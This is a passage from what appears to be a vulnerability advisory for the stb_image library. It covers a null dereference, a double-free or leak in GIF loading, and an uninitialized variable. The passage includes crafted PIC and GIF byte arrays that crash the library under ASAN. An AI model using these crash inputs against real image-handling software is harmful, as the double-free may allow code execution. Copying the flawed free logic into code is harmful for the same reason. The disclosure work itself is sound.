<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#define STB_IMAGE_IMPLEMENTATION
#include</span> <span class="cpf">"../stb_image.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span>
                            <span class="mh">0x74</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0xab</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span>
                            <span class="mh">0x20</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x79</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x6d</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span>
                            <span class="mh">0x20</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span>
                            <span class="mh">0x49</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x43</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
                            <span class="mh">0x08</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span>
                            <span class="mh">0x69</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span>
                            <span class="mh">0x43</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x10</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">,</span> <span class="n">channels</span><span class="p">;</span>
    <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==183891==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x0000004f944d bp 0x7ffefb18fe50 sp 0x7ffefb18fa00 T0)
==183891==The signal is caused by a READ memory access.
==183891==Hint: address points to the zero page.
    #0 0x4f944d in stbi__convert_format(unsigned char*, int, int, unsigned int, unsigned int) tests/../stb_image.h:1786:52
    #1 0x4ecdbe in stbi__pic_load(stbi__context*, int*, int*, int*, int, stbi__result_info*) tests/../stb_image.h:6535:11
    #2 0x4e463b in stbi__load_main(stbi__context*, int*, int*, int*, int, stbi__result_info*, int) tests/../stb_image.h:1159:35
    #3 0x4dc48f in stbi__load_and_postprocess_8bit(stbi__context*, int*, int*, int*, int) tests/../stb_image.h:1261:19
    #4 0x4de334 in stbi_load_from_memory tests/../stb_image.h:1431:11
</code></pre></div></div>

<h3 id="issue-6-possible-double-free-or-memory-leak-in-stbi__load_gif_main-ghsl-2023-150">Issue 6: Possible double-free or memory leak in <code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code> (<code class="language-plaintext highlighter-rouge">GHSL-2023-150</code>)</h3>

<p>It may look like <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6962-L7045"><code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code></a> doesn’t give guarantees about the content of output value <code class="language-plaintext highlighter-rouge">*delays</code> upon failure. Although it sets <code class="language-plaintext highlighter-rouge">*delays</code> to zero at the beginning [1], it doesn’t do it in case the image is not recognized as GIF [2] and a call to <code class="language-plaintext highlighter-rouge">stbi__load_gif_main_outofmem</code> only <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L6957">frees possibly allocated memory in <code class="language-plaintext highlighter-rouge">*delays</code> without resetting it to zero</a> in [3], [4], [5] and [6]. Thus it would be fair to say the caller of <code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code> is responsible to free the allocated memory in <code class="language-plaintext highlighter-rouge">*delays</code> only if <code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code> returns a non null value. However at the same time the function may return null value, but fail to free the memory in <code class="language-plaintext highlighter-rouge">*delays</code> if internally <code class="language-plaintext highlighter-rouge">stbi__convert_format</code> is called and fails [7].</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">stbi__load_gif_main</span><span class="p">(</span><span class="n">stbi__context</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="o">**</span><span class="n">delays</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">y</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">z</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">comp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">req_comp</span><span class="p">)</span>
<span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">stbi__gif_test</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="p">{</span>
<span class="p">...</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">delays</span><span class="p">)</span> <span class="p">{</span>
         <span class="o">*</span><span class="n">delays</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// [1]</span>
      <span class="p">}</span>

      <span class="k">do</span> <span class="p">{</span>
         <span class="n">u</span> <span class="o">=</span> <span class="n">stbi__gif_load_next</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">g</span><span class="p">,</span> <span class="n">comp</span><span class="p">,</span> <span class="n">req_comp</span><span class="p">,</span> <span class="n">two_back</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="n">u</span> <span class="o">==</span> <span class="p">(</span><span class="n">stbi_uc</span> <span class="o">*</span><span class="p">)</span> <span class="n">s</span><span class="p">)</span> <span class="n">u</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// end of animated gif marker</span>

         <span class="k">if</span> <span class="p">(</span><span class="n">u</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">x</span> <span class="o">=</span> <span class="n">g</span><span class="p">.</span><span class="n">w</span><span class="p">;</span>
            <span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="n">g</span><span class="p">.</span><span class="n">h</span><span class="p">;</span>
            <span class="o">++</span><span class="n">layers</span><span class="p">;</span>
            <span class="n">stride</span> <span class="o">=</span> <span class="n">g</span><span class="p">.</span><span class="n">w</span> <span class="o">*</span> <span class="n">g</span><span class="p">.</span><span class="n">h</span> <span class="o">*</span> <span class="mi">4</span><span class="p">;</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
               <span class="kt">void</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">stbi_uc</span><span class="o">*</span><span class="p">)</span> <span class="n">STBI_REALLOC_SIZED</span><span class="p">(</span> <span class="n">out</span><span class="p">,</span> <span class="n">out_size</span><span class="p">,</span> <span class="n">layers</span> <span class="o">*</span> <span class="n">stride</span> <span class="p">);</span>
               <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tmp</span><span class="p">)</span>
                  <span class="k">return</span> <span class="n">stbi__load_gif_main_outofmem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">delays</span><span class="p">);</span> <span class="c1">// [3]</span>
               <span class="k">else</span> <span class="p">{</span>
                   <span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="n">stbi_uc</span><span class="o">*</span><span class="p">)</span> <span class="n">tmp</span><span class="p">;</span>
                   <span class="n">out_size</span> <span class="o">=</span> <span class="n">layers</span> <span class="o">*</span> <span class="n">stride</span><span class="p">;</span>
               <span class="p">}</span>

               <span class="k">if</span> <span class="p">(</span><span class="n">delays</span><span class="p">)</span> <span class="p">{</span>
                  <span class="kt">int</span> <span class="o">*</span><span class="n">new_delays</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span> <span class="n">STBI_REALLOC_SIZED</span><span class="p">(</span> <span class="o">*</span><span class="n">delays</span><span class="p">,</span> <span class="n">delays_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">*</span> <span class="n">layers</span> <span class="p">);</span>
                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">new_delays</span><span class="p">)</span>
                     <span class="k">return</span> <span class="n">stbi__load_gif_main_outofmem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">delays</span><span class="p">);</span> <span class="c1">// [4]</span>
                  <span class="o">*</span><span class="n">delays</span> <span class="o">=</span> <span class="n">new_delays</span><span class="p">;</span>
                  <span class="n">delays_size</span> <span class="o">=</span> <span class="n">layers</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">);</span>
               <span class="p">}</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
               <span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="n">stbi_uc</span><span class="o">*</span><span class="p">)</span><span class="n">stbi__malloc</span><span class="p">(</span> <span class="n">layers</span> <span class="o">*</span> <span class="n">stride</span> <span class="p">);</span>
               <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span>
                  <span class="k">return</span> <span class="n">stbi__load_gif_main_outofmem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">delays</span><span class="p">);</span> <span class="c1">// [5]</span>
               <span class="n">out_size</span> <span class="o">=</span> <span class="n">layers</span> <span class="o">*</span> <span class="n">stride</span><span class="p">;</span>
               <span class="k">if</span> <span class="p">(</span><span class="n">delays</span><span class="p">)</span> <span class="p">{</span>
                  <span class="o">*</span><span class="n">delays</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span> <span class="n">stbi__malloc</span><span class="p">(</span> <span class="n">layers</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="p">);</span>
                  <span class="k">if</span> <span class="p">(</span><span class="o">!*</span><span class="n">delays</span><span class="p">)</span>
                     <span class="k">return</span> <span class="n">stbi__load_gif_main_outofmem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">g</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">delays</span><span class="p">);</span> <span class="c1">// [6]</span>
                  <span class="n">delays_size</span> <span class="o">=</span> <span class="n">layers</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">);</span>
               <span class="p">}</span>
            <span class="p">}</span>
            <span class="n">memcpy</span><span class="p">(</span> <span class="n">out</span> <span class="o">+</span> <span class="p">((</span><span class="n">layers</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">stride</span><span class="p">),</span> <span class="n">u</span><span class="p">,</span> <span class="n">stride</span> <span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">layers</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
               <span class="n">two_back</span> <span class="o">=</span> <span class="n">out</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">stride</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">delays</span><span class="p">)</span> <span class="p">{</span>
               <span class="p">(</span><span class="o">*</span><span class="n">delays</span><span class="p">)[</span><span class="n">layers</span> <span class="o">-</span> <span class="mi">1U</span><span class="p">]</span> <span class="o">=</span> <span class="n">g</span><span class="p">.</span><span class="n">delay</span><span class="p">;</span>
            <span class="p">}</span>
         <span class="p">}</span>
      <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">u</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>

<span class="p">...</span>

      <span class="c1">// do the final conversion after loading everything;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">req_comp</span> <span class="o">&amp;&amp;</span> <span class="n">req_comp</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span>
         <span class="n">out</span> <span class="o">=</span> <span class="n">stbi__convert_format</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">req_comp</span><span class="p">,</span> <span class="n">layers</span> <span class="o">*</span> <span class="n">g</span><span class="p">.</span><span class="n">w</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="n">h</span><span class="p">);</span> <span class="c1">// [7]</span>

      <span class="o">*</span><span class="n">z</span> <span class="o">=</span> <span class="n">layers</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">out</span><span class="p">;</span>
   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">stbi__errpuc</span><span class="p">(</span><span class="s">"not GIF"</span><span class="p">,</span> <span class="s">"Image was not as a gif type."</span><span class="p">);</span> <span class="c1">// [2]</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Thus the issue may lead to a memory leak if the caller chooses to free <code class="language-plaintext highlighter-rouge">delays</code> only when <code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code> didn’t fail:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">int</span><span class="o">*</span> <span class="n">delays</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">delays</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="n">req_comp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">img</span><span class="p">)</span>
      <span class="n">free</span><span class="p">(</span><span class="n">delays</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
</code></pre></div></div>

<p>or to a double-free if the <code class="language-plaintext highlighter-rouge">delays</code> is always freed (since calling <code class="language-plaintext highlighter-rouge">free(NULL)</code> is safe).</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">int</span><span class="o">*</span> <span class="n">delays</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">delays</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="n">req_comp</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">delays</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
</code></pre></div></div>

<p>Code search finds both usage scenarios in the wild.</p>

<h4 id="impact-5">Impact</h4>

<p>This issue may lead to code execution.</p>

<h4 id="resources-5">Resources</h4>

<p>To reproduce the issue:</p>

<ol>
  <li>Make ASAN build of the following program:</li>
</ol>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#define STB_IMAGE_IMPLEMENTATION
#include</span> <span class="cpf">"../stb_image.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x47</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x46</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x39</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0x79</span><span class="p">,</span><span class="mh">0xa9</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span>
                            <span class="mh">0x43</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xbe</span><span class="p">,</span>
                            <span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x0a</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span>
                            <span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x71</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x27</span><span class="p">,</span>
                            <span class="mh">0x8e</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x9e</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xae</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span>
                            <span class="mh">0x74</span><span class="p">,</span><span class="mh">0x6d</span><span class="p">,</span><span class="mh">0xdf</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0xae</span><span class="p">,</span><span class="mh">0xef</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x4f</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0xa0</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span>
                            <span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="mh">0x9f</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0xfe</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span>
                            <span class="mh">0x4a</span><span class="p">,</span><span class="mh">0xad</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x8f</span><span class="p">,</span><span class="mh">0xd8</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0xcb</span><span class="p">,</span><span class="mh">0xed</span><span class="p">,</span><span class="mh">0x7a</span><span class="p">,</span><span class="mh">0xbf</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0xb0</span><span class="p">,</span>
                            <span class="mh">0x78</span><span class="p">};</span>
    <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">,</span> <span class="n">channels</span><span class="p">;</span>
    <span class="kt">int</span><span class="o">*</span> <span class="n">delays</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">stbi_uc</span> <span class="o">*</span><span class="n">img</span> <span class="o">=</span> <span class="n">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">delays</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">y</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">z</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channels</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">delays</span><span class="p">);</span>
    <span class="n">stbi_image_free</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Run the program with ASAN with an instruction that allocator may fail (otherwise ASAN will quit early with <code class="language-plaintext highlighter-rouge">AddressSanitizer: requested allocation size ... exceeds maximum supported size</code>): <code class="language-plaintext highlighter-rouge">ASAN_OPTIONS=allocator_may_return_null=1 &lt;program name&gt;</code> to hit the error.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>==253229==ERROR: AddressSanitizer: attempting double-free on 0x602000000010 in thread T0:
    #0 0x49e542 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3
    #1 0x4e4064 in main tests/repro.c:22:5
</code></pre></div></div>

<h3 id="issue-7-null-pointer-dereference-because-of-an-uninitialized-variable-ghsl-2023-151">Issue 7: Null pointer dereference because of an uninitialized variable (<code class="language-plaintext highlighter-rouge">GHSL-2023-151</code>)</h3>

<p>If <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1448"><code class="language-plaintext highlighter-rouge">stbi__load_gif_main</code></a> in <a href="https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1442-L1454"><code class="language-plaintext highlighter-rouge">stbi_load_gif_from_memory</code></a> [1] fails it returns a null pointer and may keep the <code class="language-plaintext highlighter-rouge">z</code> variable uninitialized. In case the caller also sets the flip vertically flag [2], it continues and calls <code class="language-plaintext highlighter-rouge">stbi__vertical_flip_slices</code> [3] with the null pointer <code class="language-plaintext highlighter-rouge">result</code> value and the uninitialized <code class="language-plaintext highlighter-rouge">z</code> value.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STBIDEF</span> <span class="n">stbi_uc</span> <span class="o">*</span><span class="nf">stbi_load_gif_from_memory</span><span class="p">(</span><span class="n">stbi_uc</span> <span class="k">const</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="o">**</span><span class="n">delays</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">y</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">z</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">comp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">req_comp</span><span class="p">)</span>
<span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
   <span class="n">stbi__context</span> <span class="n">s</span><span class="p">;</span>
